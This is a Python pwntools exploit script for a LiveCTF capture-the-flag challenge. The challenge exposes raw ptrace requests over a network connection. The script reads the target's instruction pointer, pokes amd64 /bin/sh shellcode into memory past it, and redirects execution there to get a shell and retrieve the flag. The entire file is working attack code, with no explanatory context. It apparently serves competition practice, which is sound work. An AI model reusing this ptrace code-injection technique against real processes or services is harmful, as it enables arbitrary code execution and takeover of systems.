from pwn import *

PTRACE_PEEKTEXT = 1
PTRACE_PEEKDATA = 2
PTRACE_PEEKUSER = 3
PTRACE_POKETEXT = 4
PTRACE_POKEDATA = 5
PTRACE_POKEUSER = 6
PTRACE_CONT = 7
PTRACE_KILL = 8


RIP = 16
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# s = process("./challenge")
s = remote(HOST, int(PORT))

def submit(s:remote):
    s.sendline(b'./submitter')
    flag = s.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)

def another():
    s.sendlineafter(b"Do another (0/1)?",b"1")

def ptrace(req,addr,data):
    s.sendlineafter(b"What ptrace request do you want to send?",hex(req).encode()[2:])
    s.sendlineafter(b"What address do you want?",hex(addr).encode()[2:])
    s.sendlineafter(b"What do you want copied into data?",hex(data).encode()[2:])
    s.recvuntil(b"ptrace returned ")
    return int(s.recvline(keepends=False),16)

def getReg(REG):
    return ptrace(PTRACE_PEEKUSER,REG*8,0)

def setReg(REG,value):
    return ptrace(PTRACE_POKEUSER,REG*8,value)

def setData(addr,value):
    print(hex(addr),hex(value))
    return ptrace(PTRACE_POKEDATA,addr,value)

def getData(addr):
    return ptrace(PTRACE_PEEKDATA,addr,0)

def writeData(addr,value):
    for i in range(0,len(value),8):
        sc = shellcode[i:i+8]
        sc = sc.ljust(8,b'\x90')
        sc = u64(sc)
        setData(addr+i,sc)
        another()

rip = getReg(RIP)
another()
print(hex(rip))
context.arch='amd64'

shellcode = shellcraft.sh()
shellcode = asm(shellcode)
writeData(rip+0x100,shellcode)
setReg(RIP,rip+0x100)
s.sendline(b'0')
submit(s)
# s.interactive()